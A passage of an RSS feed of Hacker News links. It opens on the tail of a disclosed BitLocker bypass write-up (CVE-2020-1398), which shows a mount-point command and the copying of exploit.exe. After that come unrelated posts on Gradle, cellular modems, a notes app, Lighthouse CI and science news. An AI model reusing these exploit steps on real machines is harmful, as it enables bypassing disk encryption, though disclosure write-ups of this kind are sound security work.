</code></pre></div></div><p>We will use James Forshaw’s tool (attached) to create the mount point.</p><div><div><pre><code>D:\&gt;createmountpoint "System Volume Information" "\RPC Control"
</code></pre></div></div><p>Then copy the attached exploit.exe to it.</p><div><div><pre><code>D:\&gt;copy c:\Users\jonas\source\repos\exploitKit\x64\Release\exploit.exe .
1 file(s) copied.
</code></pre></div></div><p>I disclosed this vulnerability and it was assigned CVE-2020-1398. Its patch can be found <a href="https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2020-1398">here</a></p></div></div>]]>
            </description>
            <link>https://secret.club/2021/01/15/bitlocker-bypass.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25808059</guid>
            <pubDate>Sun, 17 Jan 2021 04:16:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Problem with Gradle: Really?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25807913">thread link</a>) | @fctorial
<br/>
January 16, 2021 | https://melix.github.io/blog/2021/01/the-problem-with-gradle.html | <a href="https://web.archive.org/web/*/https://melix.github.io/blog/2021/01/the-problem-with-gradle.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Bruce says that any build system is basically the combination of two essential ingredients: <em>tasks</em> and <em>dependencies</em>, where dependencies are seen as artifacts.</p>
<p>That is not quite correct in case for Gradle: Gradle is responsible for wiring units of work together, either through explicit or implicit dependencies.
It’s important to understand that "dependency" here has a wider meaning: it’s something which is required to be able to execute a unit of work.
There is, technically speaking, no difference between an external and an internal dependency. What matters is that we have units of work, which have inputs and outputs.
The role of Gradle is to wire things so that everything is ordered properly and optimized for execution (parallelism, caching, …).
It’s a mistake to think that there are only tasks and dependencies (files, mostly): there are work units, inputs and outputs.
A task (say, <code>JavaCompile</code>) is just <em>one kind</em> of work unit, but that’s not the only one. Here are some other kind of work units: transforming artifacts (for example, transform a <em>jar</em> into something else before it is consumed), downloading a toolchain, uploading an artifact to the build cache, … A task itself can be splitted into several work units in order to maximize incrementality and parallelism.</p>
<p>A lot of the criticism we see on Gradle is because there’s a mismatch between the mental model of what Gradle is, and the surface, which is the language(s) it uses to configure the actual model.</p>
<p>A lot of the confusion comes from the fact that while Gradle has a vision, it should be better shared and explained.
It’s also victim of its age which means success: the road towards fine grained execution, safe parallelism, configuration, … is hard and there are some APIs which are sub-optimal for this, and <a href="https://docs.google.com/forms/d/e/1FAIpQLSc9aQrjjsxVqXDkYR35ExeiI1yEIksRXVtN6asuaem084l3aA/viewform">maintaining backwards compatibility is a day-to-day challenge</a>.</p>
<p>Let’s explain a bit what Gradle has to do, when you say that you want to execute a <em>task</em>:</p>
<div>
<ul>
<li>
<p>configure the task (execute its <em>configuration phase</em>), which means executing plugins which configure the default values, use your configuration, etc.</p>
</li>
<li>
<p>compute the <em>dependencies</em> of the task, which can either be explicit (typically the <code>dependsOn</code> clause) or <em>implicit</em> (because you configured a task input as the output of another task, typically): this is basically a directed graph resolution engine, which is very fine grained and where each node is a unit of work.</p>
</li>
<li>
<p>and finally executes the nodes of the graph in an optimized way</p>
</li>
</ul>
</div>
<p>Historically, Gradle has separated the <em>configuration phase</em> from the <em>execution phase</em>, but it doesn’t have to be that way: as soon as the inputs of a task are ready, we should be able to execute it, and we shouldn’t have to wait for the configuration of other tasks to be ready to do it.
Also Gradle made it easy, in the beginning, to <em>inline</em> the definition of tasks, including their execution phase, in a build script, but it is, for quite some time, considered a bad design principle: don’t write <em>build logic</em> in build scripts. The whole blog post from Bruce never mentions this term a single time: <a href="https://docs.gradle.org/current/userguide/custom_plugins.html">write plugins</a>!</p>
<p>Despite our efforts, lots of resources on the web still focus on how to declare tasks, how flexible Gradle is, without taking time to leverage good engineering practices. In Java nobody writes a giant single class with all the logic <em>and</em> the data as code, right? So don’t do it in your build, that’s as simple as that.</p>
<p>Let’s be honest: it’s partly our fault, and for that I agree with Bruce: the documentation of Gradle is huge and things can be made better, especially for beginners.
It’s also true that the docs contain <em>outdated patterns</em> and it’s often very difficult to realize that you have outdated info in thousands of pages of docs.</p>
<p>There is, however, a good amount of resources for beginners:</p>

<div>
<h3 id="_deconstructing_the_myth">Deconstructing the myth</h3>
<div>
<blockquote>
<p>We are still in the early days of the “adding a build system atop an existing language” paradigm. Gradle is an experiment in this paradigm, so we expect some sub-optimal choices. However, by understanding its issues you might have less frustration learning Gradle than I did.</p>
</blockquote>
<p><cite>The Problem With Gradle</cite><br>
— Bruce Eckel
</p>
</div>
<p>This is incorrect. Thinking that Gradle is just about calling methods is the wrong mental model. Thinking that Gradle is "programming a build" is wrong. Gradle uses a programming language as a foundation for "configuration as code", but it is <em>really</em> about configuration, not <em>programming</em>. Surely a programming language is interesting to use in the "configuration as code" paradigm, but focusing on that aspect and assuming that it works as a general purpose language is wrong and will inevitably lead to confusion.</p>
<p>Gradle is also <em>not</em> an experiment: it’s the most advanced tool you can find in this area, and it works <em>because</em> the language builds on top of an engine which is made to execute workflows.
A number of build tools, including modern ones, are only fast because they put the maintenance and optimization burden on the build author: declare everything, re-generate build scripts, etc.
We, in the Gradle team, think that we can be more correct, more performant <em>without</em> having to compromise on user experience.</p>
<p>We even had teams challenging us on performance with modern tools like Bazel, and we proved that with unique features like <a href="https://docs.gradle.org/current/userguide/configuration_cache.html#header">configuration caching</a>, Gradle was able to outperform it in almost all scenarios: you get the benefit of terse, maintainable scripts, with performance. win-win.</p>
<p>At this stage, it’s time to deconstruct some misconceptions of the blog post, because as long as this message is propagated, we will not achieve what should be the focus of our industry: safer, faster, reproducible builds for everyone.</p>
<div>
<h4 id="_1_you_re_not_configuring_you_re_programming">1. You’re not Configuring, You’re Programming</h4>
<p>You should see <em>Gradle build scripts</em> as <em>configuration scripts</em>, which actually configure a <em>model</em>.
The surface is a DSL, a language, but what you do, what you <em>should do</em>, is to declaratively model your software.</p>
<p>For example, this Groovy script:</p>
<div>
<div>
<pre><code>plugins {
   id 'java-library'
}

dependencies {
    api 'org.
    implementation 'org.apache.commons:commons-lang3:3.3.10'
}
</code></pre>
</div>
</div>
<p>Is a build script which configures a library written in Java, while this build script, written in Kotlin, configures a different kind of software component:</p>
<div>
<div>
<pre><code>plugins {
    id("org.gradle.presentation.asciidoctor")
}

presentation {
    githubUserName.set("melix")
    githubRepoName.set("gradle-6-whats-new")
    useAsciidoctorDiagram()
}</code></pre>
</div>
</div>
<p>which is actually a <code>reveal.js</code> slide deck, built with Gradle! This is the <em>full</em> build script for this, and it’s extremely important to realize that: the "code" that you get shouldn’t have any custom tasks, in particular: all of the complexity, which is nothing more than the "model", is hidden in a <em>plugin</em>.</p>

<p>In addition, you can watch this 10 minute video I made about writing idiomatic build scripts:</p>
<p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/MaansFoPHKg" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>
<p>What it means is that while Gradle build scripts are <em>executed</em>, this is code which <em>configures the model</em>, so you’re "programming the configuration", if you will.</p>
</div>
<div>
<h4 id="_2_groovy_is_not_java">2. Groovy is Not Java</h4>
<p>There’s not much to say here, because it barely has anything to do with Gradle.</p>
<p>You will notice that when I showed build scripts above, I showed a <em>Groovy</em> build script and a <em>Kotlin</em> one. It’s important to notice that Gradle allows both, because under the hood, it’s an API.
As I said, Gradle provides a foundation for building software components, a dependency resolution engine, an execution engine.
<em>Plugins</em> are at the core of the system and are responsible for building <em>models</em> of software we build: a Java library is different from an Android application, so there’s <em>no reason</em> to have the same source layout, for example.
The fact that Gradle uses Groovy as a language to do its configuration is an <em>implementation detail</em>.
I think it’s a mistake to consider that you need a programming language to do what Gradle does: it helps, and lots of people actually appreciate Gradle’s flexibility in that regard, but it’s not what you should focus on.</p>
<p>Both Groovy and Kotlin have pros and cons. If you use Intellij IDEA, for example, the Kotlin DSL has very good arguments and makes this model completely visible: completion is available, you don’t have to "guess" what to type: depending on the plugins you apply, you get the configuration blocks you need, and nothing more!</p>
<p>To come back to this section, a common misconception is that Gradle is written in Groovy. It’s not. Gradle is written in Java, mostly. There’s a lot of Groovy code in Gradle for testing (we use Spock, in particular), but we also have Kotlin code. The build scripts, however, use Groovy or Kotlin.</p>
<p>The DSL design definitely was influenced by Groovy, though, that’s very true.</p>
</div>
<div>
<h4 id="_3_gradle_uses_a_domain_specific_language">3. Gradle Uses a Domain-Specific Language</h4>
<p>Yes it does. I should say it’s an "extensible" DSL. But when I’m reading this:</p>
<div>
<blockquote>
<p>How helpful is this DSL syntax, really? I have to translate it into function calls in my head when I read it. So for me it’s additional cognitive overhead which is ultimately a hindrance. The DSL operations can all be done with function calls, and programmers already understand function calls.</p>
</blockquote>
</div>
<p>I’m thinking that this is again seeing the problem from the wrong angle. You should <em>not</em> see this as function calls, or code being executed. You should see this as a model being configured. You can’t, actually, assume <em>when</em> this code is going to be called (because, we have configuration avoidance, for example). So a DSL is really what it means: it’s a language meant to configure the model, nothing more. By trying to interpret <em>how</em> Gradle does this, you’re actually distracted from what matters: what are you trying to build?</p>
</div>
<div>
<h4 id="_4_there_are_many_ways_to_do_the_same_thing">4. There are Many Ways to do the Same Thing</h4>
<p>This one is one of my favourites. I always read "there are too many ways to do the same thing". Sure there are. Just like in Java, can you tell me how many ways you can write a loop? Let’s see…</p>
<div>
<p>indexed loop</p>
<div>
<pre><code>for (int i=0; i&lt;items.length(); i++) {
   ...
}</code></pre>
</div>
</div>
<div>
<p>foreach loop</p>
<div>
<pre><code>for (String item: items) {
...
}</code></pre>
</div>
</div>
<div>
<p>while loop</p>
<div>
<pre><code>Iterator&lt;String&gt; it = …</code></pre></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://melix.github.io/blog/2021/01/the-problem-with-gradle.html">https://melix.github.io/blog/2021/01/the-problem-with-gradle.html</a></em></p>]]>
            </description>
            <link>https://melix.github.io/blog/2021/01/the-problem-with-gradle.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807913</guid>
            <pubDate>Sun, 17 Jan 2021 03:47:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dissecting modern (3G/4G) cellular modems (2016)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25807836">thread link</a>) | @pabs3
<br/>
January 16, 2021 | https://media.ccc.de/v/33c3-8151-dissecting_modern_3g_4g_cellular_modems | <a href="https://web.archive.org/web/*/https://media.ccc.de/v/33c3-8151-dissecting_modern_3g_4g_cellular_modems">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<div>

<p>
<span></span>
<a href="https://media.ccc.de/search?p=LaForge">LaForge</a> and
<a href="https://media.ccc.de/search?p=holger">holger</a>

</p>
<p>
Playlists:
<a href="https://media.ccc.de/v/33c3-8151-dissecting_modern_3g_4g_cellular_modems/playlist">'33c3' videos starting here</a>
/
<a data-method="get" href="https://media.ccc.de/v/33c3-8151-dissecting_modern_3g_4g_cellular_modems/audio">audio</a>
/
<a href="https://media.ccc.de/v/33c3-8151-dissecting_modern_3g_4g_cellular_modems/related">related events</a></p>
<!-- %h3 About -->
<p>Let's have a detailed look at some modern 3G/4G cellular modems and see what we can find out about their internals using undocumented debug interfaces and software or hardware based hacking techniques.</p>

<h3>Download</h3>
<div>
<div>

<div>

<div>
<div>
<h4>These files contain multiple languages.</h4>
<p>
This Talk was translated into multiple languages. The files available
for download contain all languages as separate audio-tracks. Most
desktop video players allow you to choose between them.
</p>
<p>
Please look for "audio tracks" in your desktop video player.
</p>
</div>
</div>
</div>


</div>

</div>
<h3>Related</h3>


<!-- %h3 Embed/Share -->

<h3>Tags</h3>

</div>





</div>]]>
            </description>
            <link>https://media.ccc.de/v/33c3-8151-dissecting_modern_3g_4g_cellular_modems</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807836</guid>
            <pubDate>Sun, 17 Jan 2021 03:32:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introducing Writxt]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25807816">thread link</a>) | @bradley_taunt
<br/>
January 16, 2021 | https://uglyduck.ca/introducing-writxt/ | <a href="https://web.archive.org/web/*/https://uglyduck.ca/introducing-writxt/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
        <header>
    <nav>
        
    
    <a href="https://uglyduck.ca/"><span>Home</span></a><span> /</span>
    

    
    <a href="https://uglyduck.ca/articles/"><span>Articles</span></a><span> /</span>
    

    
    <a href="https://uglyduck.ca/about/"><span>About</span></a><span> /</span>
    

    
    <a href="https://uglyduck.ca/projects/"><span>Projects</span></a><span> /</span>
    



    
    <a href="https://uglyduck.ca/privacy/"><span>Privacy</span></a><span> /</span>
    

    
    <a href="https://uglyduck.ca/colophon/"><span>Colophon</span></a><span> /</span>
    



    
    <a href="https://uglyduck.ca/atom.xml"><span>RSS</span></a><span> /</span>
    

    
    <a href="mailto:hello@uglyduck.ca"><span>Contact</span></a><span> /</span>
    


    </nav>
</header>

        
        
          <p><time datetime="2021-01-13T00:00:00+00:00">January 13, 2021</time></p>
        
        
          <p><em>I created a very basic note taking web app that utilizes the browser's local storage and comes packaged with an export function</em></p>
        
        <hr>
        <p>I’ve always been a fan of simple note taking applications, since I tend to take a lot of random notes throughout the work day. Sometimes I reach for simple pen and paper, but other times it’s nice to stay focused jotting down notes on the same device I’m working on.</p>

<p>Previously, I just created quick <code>notes.txt</code> files in my open code editor or fell back on the default OS note apps. These worked perfectly fine but often got in my way (or even worse - lost among everything else).</p>

<p>So I said the hell with it and built <a href="https://writxt.fun/">Writxt</a> (pronounced “write text”).</p>

<h2 id="what-makes-writxt-special">What makes Writxt special?</h2>

<p>Nothing, really. It’s actually a pretty “stupid” app compared to others on the market. But this one is <em>mine</em>. Plus, it was fun to piece it together on a random evening before bed.</p>

<p>For those curious, let’s take a look at the feature list:</p>

<ul>
  <li>free and open source (<a href="https://github.com/bradleytaunt/writxt">github.com/bradleytaunt/writxt</a>)</li>
  <li>uses <code>localStorage</code> to keep changes persistent (helpful for browser crashes, etc)</li>
  <li>includes basic export functionality to download content as a simple <code>output.txt</code> file</li>
</ul>

<p>That’s it. Mind blowing stuff, eh?</p>

<h2 id="making-stuff-is-fun">Making stuff is fun</h2>

<p>My main takeaway when building this tiny, dumb app was to just <em>enjoy building fun stuff</em>. It crossed my mind several times how there are already hundreds of note taking apps across the vast Internet. I also thought about how others might look at the code I wrote and go, “Oh my God - why did he do it that way? What an idiot!”. But I don’t care - I had fun making it.</p>

<p>Hopefully you enjoy using it as well!</p>

      </section></div>]]>
            </description>
            <link>https://uglyduck.ca/introducing-writxt/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807816</guid>
            <pubDate>Sun, 17 Jan 2021 03:28:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lighthouse Reports as GitHub Comment]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25807724">thread link</a>) | @bleonard
<br/>
January 16, 2021 | https://www.grouparoo.com/blog/lighthouse-reports-on-github | <a href="https://web.archive.org/web/*/https://www.grouparoo.com/blog/lighthouse-reports-on-github">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="blogContent"><div><p>Performance is an important factor for user satisfaction, conversion and SEO. <a href="https://github.com/GoogleChrome/lighthouse" target="_blank" rel="nofollow noopener noreferrer">Lighthouse</a> is a tool that creates a report on performance and other best practices. Most commonly, it used from the <a href="https://chrome.google.com/webstore/detail/lighthouse/blipmdconlkpinefehnmjammfjpmpbjk" target="_blank" rel="nofollow noopener noreferrer">chrome extension</a>.</p><div><p><img height="271" width="519" alt="Lighthouse Chrome extension" src="https://www.grouparoo.com/posts/lighthouse-reports-on-github/chrome-extension.png"></p></div><p>However, you can also run this test locally. The <code>@lhci/cli</code> library, when installed, provides the following command line tool.</p><pre><code><span>&gt;</span> next build
info  - Creating an optimized production build
info  - Compiled successfully
info  - Collecting page data
info  - Generating static pages <span>(</span><span>123</span>/123<span>)</span>
info  - Finalizing page optimization
<span>..</span>.

<span>&gt;</span> lhci autorun
✅  .lighthouseci/ directory writable
✅  Configuration <span>file</span> found
✅  Chrome installation found
Healthcheck passed<span>!</span>

Started a web server with <span>"PORT=54321 npm start"</span><span>..</span>.
Running Lighthouse <span>1</span> time<span>(</span>s<span>)</span> on http://localhost:54321/about
Run 
<span>..</span>.
Done running Lighthouse<span>!</span>

Uploading median LHR of http://localhost:54321/about<span>..</span>.success<span>!</span>
Open the report at https://storage.googleapis.com/lighthouse-infrastructure.appspot.com/reports/1610848080418-24331.report.html
<span>..</span>.

Done running autorun.
</code></pre><p>This will run for all the URLs that you tell it, launching a headless chrome browser one or more times for each to generate a report.</p><div><p><img height="180" width="519" alt="Lighthouse report from local run" src="https://www.grouparoo.com/posts/lighthouse-reports-on-github/local-report.png"></p></div><p>I have also noticed that the numbers (performance) on <code>localhost</code> are slower than on our production site. This is likely because the production site takes advantage of a CDN and other caching features. For example, the 84 score above on the <code>/about</code> page is a 96 on production. However, the local numbers correlate with the production ones.</p><h2>Configuration</h2><p>To make <code>lhci autorun</code> work how you want it, you'll need some configuration in the <code>lighthouserc.js</code> file. Ours exports this:</p><pre><code>module<span>.</span><span>exports</span> <span>=</span> <span>{</span>
  ci<span>:</span> <span>{</span>
    collect<span>:</span> <span>{</span>
      numberOfRuns<span>:</span> <span>1</span><span>,</span>
      url<span>:</span> urls<span>,</span>
      startServerCommand<span>:</span> <span>"PORT=54321 npm start"</span><span>,</span>
      settings<span>:</span> <span>{</span>
        onlyCategories<span>:</span> <span>[</span>
          <span>"performance"</span><span>,</span>
          <span>"best-practices"</span><span>,</span>
          <span>"accessibility"</span><span>,</span>
          <span>"seo"</span><span>,</span>
        <span>]</span><span>,</span> 
        skipAudits<span>:</span> <span>[</span>
          <span>"canonical"</span><span>,</span> 
        <span>]</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
    upload<span>:</span> <span>{</span>
      target<span>:</span> <span>"temporary-public-storage"</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><p>The most interesting thing about <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/lighthouserc.js" target="_blank" rel="nofollow noopener noreferrer">our implementation</a> is that it reads the sitemap so that it automatically tests all the URLs that we give to search engines. As a related matter, we are also <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/scripts/generate_static_files.ts" target="_blank" rel="nofollow noopener noreferrer">auto-generating</a> our sitemap, so this means that every time we add a page, the new page will be performance tested.</p><p>I found that setting <code>numberOfRuns</code> more than <code>1</code> just took too long. Testing a URL more than once gives more accurate results, so the tradeoff was whether to really test every page or have less accurate results. I chose to test every page and haven't seen too much variance in the results so far.</p><h2>Comment on the Pull Request</h2><p>Testing and monitoring are great, but they have to be a part of the real workflow to make any difference. I decided to start with visibility. We can update this to fail a check and prevent a merge when there is a low score later.</p><p>To add this visibility, I <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/.github/workflows/performance.yml#L2-L11" target="_blank" rel="nofollow noopener noreferrer">set up</a> Github to <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/.github/workflows/performance.yml#L12-L14" target="_blank" rel="nofollow noopener noreferrer">run an command</a> on every pull request when there is a commit.</p><p>The <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/scripts/performance_action" target="_blank" rel="nofollow noopener noreferrer">command</a> runs <code>lchi autorun</code> and then a script.</p><p>The <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/scripts/write_lighthouse_comment.ts" target="_blank" rel="nofollow noopener noreferrer">script</a> knows that <code>lhci autorun</code> puts performance reports as JSON in a certain place. It find those and generates a markdown table and writes that to disk.</p><p>Now, back in the Github action, it <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/.github/workflows/performance.yml#L15-L18" target="_blank" rel="nofollow noopener noreferrer">uses</a> the markdown to make a comment that gets updated each time there is a commit.</p><p>The result is a comment on each pull request like this <a href="https://github.com/grouparoo/www.grouparoo.com/pull/152#issuecomment-759074302" target="_blank" rel="nofollow noopener noreferrer">one</a>:</p><div><p><img height="485" width="990" alt="Lighthouse report as a Github comment" src="https://www.grouparoo.com/posts/lighthouse-reports-on-github/github-comment.png"></p></div><p>Each URL shows its Lighthouse overview and links to the real report. Success!</p><h3>Meta!</h3><p>Even the <a href="https://github.com/grouparoo/www.grouparoo.com/pull/154" target="_blank" rel="nofollow noopener noreferrer">pull request</a> for this blog post ran a <a href="https://github.com/grouparoo/www.grouparoo.com/runs/1715541127" target="_blank" rel="nofollow noopener noreferrer">check</a> got a report. 💥</p><div><p><img height="59" width="990" alt="Lighthouse report for this blog post!" src="https://www.grouparoo.com/posts/lighthouse-reports-on-github/meta.png"></p></div></div></div></div>]]>
            </description>
            <link>https://www.grouparoo.com/blog/lighthouse-reports-on-github</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807724</guid>
            <pubDate>Sun, 17 Jan 2021 03:10:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When parties reverse their stance, supporters immediately switch their opinions]]>
            </title>
            <description>
<![CDATA[
Score 187 | Comments 195 (<a href="https://news.ycombinator.com/item?id=25807656">thread link</a>) | @nabla9
<br/>
January 16, 2021 | https://thespeakernewsjournal.com/science/when-political-parties-reverse-their-policy-stance-their-supporters-immediately-switch-their-opinions-too/ | <a href="https://web.archive.org/web/*/https://thespeakernewsjournal.com/science/when-political-parties-reverse-their-policy-stance-their-supporters-immediately-switch-their-opinions-too/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
				<div id="content">
			
	<div id="primary">
		<main id="main">
			
<article id="post-15093" itemtype="https://schema.org/CreativeWork" itemscope="">
	<div>
				
					
			
		<div itemprop="text">
			<p>At least a significant portion of their supporters, according to U of Aarhus researchers.</p>
<p>When two competing political parties in Denmark reversed their policy stance on an issue — suddenly they both supported reducing unemployment benefits — their voters immediately moved their opinions by around 15% into line with their party.</p>
<p>The same thing happened when one of these parties shifted from opposing to supporting ending Denmark’s early retirement.</p>
<p>The researchers were studying how public opinion is formed. Their recent paper sheds light on how much influence political parties have over their supporters, according to the researchers, who surveyed their panel of subjects in five successive waves between 2010 and 2011. They studied the same group of party supporters before, during and after a policy reversal.</p>
<p>“We can see that [the] welfare programs were actually quite popular … and many of the voters of the center-right party were in favor of these welfare programs,” commented one of the researchers, Rune Slothuus. “Nevertheless, we can see that they reversed their opinion from supporting these welfare programs to opposing these welfare programs.”</p>
<p dir="ltr">“I was surprised to see the parties appeared this powerful in shaping opinions,” Slothuus said. “Our findings suggest that partisan leaders can indeed lead citizens’ opinions in the real world, even in situations where the stakes are real and the economic consequences tangible.”</p>
<p dir="ltr">The researchers pondered Western democracy in light of their findings: “If citizens just blindly follow their party without thinking much about it, that should lead to some concern about the mechanisms in our democracy. Because how can partisan elites represent citizens’ views if the views of citizens are shaped by the very same elites who are supposed to represent them?”</p>
<h6 dir="ltr">Source: How Political Parties Shape Public Opinion in the Real World.  and <a id="a2_Ctrl" role="button" href="https://onlinelibrary.wiley.com/action/doSearch?ContribAuthorStored=Bisgaard%2C+Martin" data-id="a2" data-db-target-for="a2" aria-controls="a2" aria-haspopup="true">Martin Bisgaard. </a><span>First published: </span><span>04 November 2020</span> <a href="https://doi.org/10.1111/ajps.12550" aria-label="Digital Object Identifier">https://doi.org/10.1111/ajps.12550</a></h6>

						


<div>
    <h3>The brain listens for things it is trying to predict</h3>
    <div><p>The brain interprets sounds as they contrast with its expectations; it recognizes patterns of sounds faster when they’re in line with what it is predicting it will hear, but it only encodes sounds when they contrast with expectations, according to <span>Technische U researchers. </span></p>
<p>The researchers showed this by monitoring the two principal nuclei of the subcortical pathway responsible for auditory processing: the inferior colliculus and the medial geniculate body, as their subjects listened to patterns of sounds which the researches modified so that sometimes they would hear an expected sound pattern, and other times something unexpected.</p>
<h6>Source: Alejandro Tabas, Glad Mihai, Stefan Kiebel, Robert Trampel, Katharina von Kriegstein. <strong>Abstract rules drive adaptation in the subcortical sensory pathway</strong>. <em>eLife</em>, 2020; 9 DOI: <a href="http://dx.doi.org/10.7554/eLife.64501" target="_blank" rel="nofollow noopener">10.7554/eLife.64501</a></h6>
</div>
</div>
						


<div>
    <h3>We have a particular way of understanding a room</h3>
    <div><p>When several research subjects were instructed to explore an empty room, and when they were instead seated in a chair and watched someone else explore the room, their brain waves followed a certain pattern, as recorded by a backpack hooked up to record their brain waves, eye movements, and paths. It didn’t matter if they were walking or watching someone else, according to UC researchers led by Dr Matthias Stangl.</p>
<p>The researchers also tested what happened when subjects searched for a hidden spot, or watched someone else do so, and found that brain waves flowed more strongly when they had a goal and hunted for something.</p>
<h6>Source: Matthias Stangl, Uros Topalovic, Cory S. Inman, Sonja Hiller, Diane Villaroman, Zahra M. Aghajan, Leonardo Christov-Moore, Nicholas R. Hasulak, Vikram R. Rao, Casey H. Halpern, Dawn Eliashiv, Itzhak Fried, Nanthia Suthana. <strong>Boundary-anchored neural mechanisms of location-encoding for self and others</strong>. <em>Nature</em>, 2020; DOI: <a href="http://dx.doi.org/10.1038/s41586-020-03073-y" target="_blank" rel="nofollow noopener">10.1038/s41586-020-03073-y</a></h6>
</div>
</div>
						


<div>
    <h3>Extroverts and introverts use different vocabularies</h3>
    <div><p>Extroverts use ‘positive emotion’ and ‘social process’ words more often than introverts, according to new research conducted at <span>Nanyang Technological U</span>.</p>
<p>‘Love,’ ‘happy,’ and ‘blessed’ indicate pleasant emotions, and ‘beautiful’ and ‘nice’ indicate positivity or optimism, and are among the words found to be used more often by extroverts. So too are ‘meet,’ ‘share,’ and ‘talk,’ which are about socializing. Extroverts use personal pronouns — except ‘I’ — more too, another indication of sociability.</p>
<p>The correlation, however, was small, and the researchers think that stronger linguistic indicators need to be found to achieve their general goal, which is improving machine learning approaches to targeting consumer marketing.</p>
<h6>Source: Jiayu Chen, Lin Qiu, Moon-Ho Ringo Ho. <strong>A meta-analysis of linguistic markers of extraversion: Positive emotion and social process words</strong>. <em>Journal of Research in Personality</em>, 2020; 89: 104035 DOI: <a href="http://dx.doi.org/10.1016/j.jrp.2020.104035" target="_blank" rel="nofollow noopener">10.1016/j.jrp.2020.104035</a></h6>
</div>
</div>
						


<div>
    <h3>WhatsApp is changing today - Users must give the app permission to send their private data to Facebook or lose account</h3>
    <div><p>WhatsApp was bought by Facebook in 2014, but has thrived while promoting itself as a privacy-respecting messaging app that now has 1.5b monthly active users. This week, though, WhatApp sent out an update to users’ phones that they must ‘consent’ to a new policy or lose access.</p>
<p>Whatsapp will now share more of your data, including your IP address (your location) and phone number, your account registration information, your transaction data, and service-related data, interactions on WhatsApp, and other data collected based on your consent, with Facebook’s other companies. Facebook has been working towards more closely integrating Facebook, WhatsApp, Instagram and Messenger.</p>
<p>Users who do not agree to ‘consent’ to the new policy will see their WhatsApp account become inaccessible until they do ‘consent.’ These accounts will remain dormant for 120 days after which they will be ‘deleted.’</p>
<p>The biggest change to the user policy, which many people ignored and clicked ‘agree’ to, thinking it was just another unimportant app update message, now reads,</p>
<blockquote><p><em>‘We collect information about your activity on our Services, like service-related, diagnostic, and performance information. This includes information about your activity (including how you use our Services, your Services settings, how you interact with others using our Services (including when you interact with a business), and the time, frequency, and duration of your activities and interactions), log files, and diagnostic, crash, website, and performance logs and reports. This also includes information about when you registered to use our Services; the features you use like our messaging, calling, Status, groups (including group name, group picture, group description), payments or business features; profile photo, “about” information; whether you are online, when you last used our Services (your “last seen”); and when you last updated your “about” information.’</em></p></blockquote>
<p>Notably, Elon Musk tweeted on the news, saying that WhatsApp users should switch to Signal, one of several popular privacy-focused messaging apps similar to WhatsApp.</p>
<p>The data sharing policy change doesn’t affect people in Europe due to GDPR data protection regulations.</p>
</div>
</div>
						


<div>
    <h3>President Trump silenced on top social media platforms after mob storms Capitol</h3>
    <div><p>The US president was locked out from posting new messages on his Facebook and Twitter accounts after an unruly group of supporters assembled outside the capitol building where Biden’s election win was being confirmed.</p>
<p>The lockdown on Twitter lasted 12 hours until the president removed tweets Twitter said violated its ‘civic integrity policy,’ but Zuckerburg said that Trump would be silenced on Facebook and Instagram for at least two more weeks until his presidential term was over. Facebook and Twitter are two of the main ways the president communicates with citizens and the world.</p>
<p>It is the first time social media platforms have chosen to limit the free speech of such an important figure.</p>
<h6><em>Trump’s tweets from Jan 6, 2020, as recorded by thetrumparchive.com</em></h6>


<p>Many news organizations covered the story using language such as <a href="https://thespeakernewsjournal.com/wp-content/uploads/2021/01/Trump-Incites-Rioters.png" target="_blank" rel="noopener" data-slb-active="1" data-slb-asset="69001008" data-slb-internal="0" data-slb-group="15093_15041">‘Trump Incites Rioters.’</a></p>
<p>Following Trumps ‘ban,’ there was renewed talk about treating social media platforms, where people share informative content, as publishers themselves, in part because their algorithms amplify things shared when those things are engaging. There was also talk about how the social media platforms that censored the president’s content did so as a response to content or events but without first drawing their ‘red line’ and saying which content is and isn’t allowed on their platforms.</p>
<p>Some of Trump’s staff resigned following the incident at the Capitol building, and there were also a lot of questions why the national guard wasn’t capable of handling the incident properly.</p>
